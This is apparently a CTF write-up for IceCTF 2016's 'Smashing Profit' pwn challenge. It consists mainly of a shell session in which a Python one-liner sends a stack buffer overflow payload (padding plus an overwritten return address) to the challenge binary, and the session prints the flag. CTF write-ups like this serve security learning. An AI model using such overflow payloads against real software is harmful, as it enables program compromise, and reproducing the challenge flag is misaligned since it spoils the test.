---
layout: post
title: Smashing Profit - IceCTF 2016 (60 pts)
description: Challenge Smashing Profit of IceCTF 2016
keywords: smashing, profit, icectf, pwn, 2016,
tags: [IceCTF]
---

* **CTF:** IceCTF 2016
* **Challenge:** Smashing Profit (60 pts)
* **Category:** Pwn
* **Solved by:** RTFM[ChOkO] 

****  
>Description: N/A  
****  


```bash
╭─ctf-40870@icectf-shell-2016 /home/profit  
╰─➤  python -c 'print "A" * 76 + "\x0b\x85\x04\x08"' | ./profit
Smashing the stack for fun and...?
IceCTF{who_would_have_thunk?}
[1]    21322 done                          python -c 'print "A" * 76 + "\x0b\x85\x04\x08"' | 
       21324 illegal hardware instruction  ./profit
IceCTF{who_would_have_thunk?}
```

**Flag:** IceCTF{who_would_have_thunk?}
